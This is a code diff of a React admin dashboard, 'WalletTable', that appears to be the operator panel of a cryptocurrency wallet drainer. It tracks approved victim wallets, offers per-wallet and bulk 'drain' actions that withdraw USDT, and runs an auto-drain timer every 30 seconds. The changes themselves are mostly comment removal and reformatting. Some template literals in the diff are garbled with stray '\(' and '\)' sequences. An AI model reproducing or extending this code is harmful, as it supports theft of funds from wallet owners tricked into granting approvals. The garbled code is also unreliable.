@@ -18,7 +18,7 @@ interface Wallet {
   id: string;
   address: string;
   is_approved: boolean;
-  approval_status: boolean; // kept for compatibility
+  approval_status: boolean;
   approval_tx_hash: string | null;
   drained: boolean;
   drain_tx_hash: string | null;
@@ -36,7 +36,6 @@ interface GasInfo {
 }
 
 const AUTO_DRAIN_INTERVAL = 30_000;
-const REFRESH_INTERVAL = 30_000;
 
 export default function WalletTable({ adminKey }: { adminKey: string }) {
   const toast = useToast();
@@ -61,13 +60,12 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     try {
       const res = await fetch("/api/wallets", {
         headers: authHeaders(),
-        cache: "no-store", // ← Force fresh data every time
+        cache: "no-store",
       });
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
 
       if (data.wallets) {
-        // Map both column names for compatibility
         const mapped = data.wallets.map((w: any) => ({
           ...w,
           is_approved: w.is_approved ?? w.approval_status ?? false,
@@ -132,13 +130,17 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
   const drainWallet = useCallback(async (walletId: string, silent = false, limitUsd?: number) => {
     if (!silent) setDraining(walletId);
     try {
-      const url = `/api/wallets/\( {walletId}/withdraw \){limitUsd ? `?limitUsd=${limitUsd}` : ""}`;
+      const url = limitUsd
+        ? `/api/wallets/\( {walletId}/withdraw?limitUsd= \){limitUsd}`
+        : `/api/wallets/${walletId}/withdraw`;
+
       const res = await fetch(url, {
         method: "POST",
         headers: authHeaders(),
       });
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+
       toast.success(`Drained ${data.amount} USDT! TX: ${data.txHash?.slice(0, 16)}...`);
       await fetchWallets();
     } catch (err: unknown) {
@@ -155,6 +157,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
       const res = await fetch("/api/bot/drain", { method: "POST", headers: authHeaders() });
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+
       const drained = (data.results ?? []).filter((r: { status: string }) => r.status === "drained").length;
       const skipped = (data.results ?? []).filter((r: { status: string }) => r.status === "skipped_low_balance").length;
       const failed = (data.results ?? []).filter((r: { status: string }) => r.status?.startsWith("failed")).length;
@@ -182,11 +185,12 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
         headers: authHeaders(),
         body: JSON.stringify({
           is_approved: !currentStatus,
-          approval_status: !currentStatus, // send both for compatibility
+          approval_status: !currentStatus,
         }),
       });
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+
       const newStatus = !currentStatus ? "Approved" : "Revoked";
       toast.success(`Wallet ${newStatus}.`);
       await fetchWallets();
@@ -487,7 +491,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                     </td>
 
                     <td className="px-4 py-3 whitespace-nowrap text-gray-500 text-xs">
-                      {wallet.connected_at ? new Date(wallet.connected_at).toLocaleString() : formatDate(wallet.created_at)}
+                      {wallet.connected_at ? new Date(wallet.connected_at).toLocaleString() : new Date(wallet.created_at).toLocaleString()}
                     </td>
 
                     <td className="px-4 py-3 whitespace-nowrap">
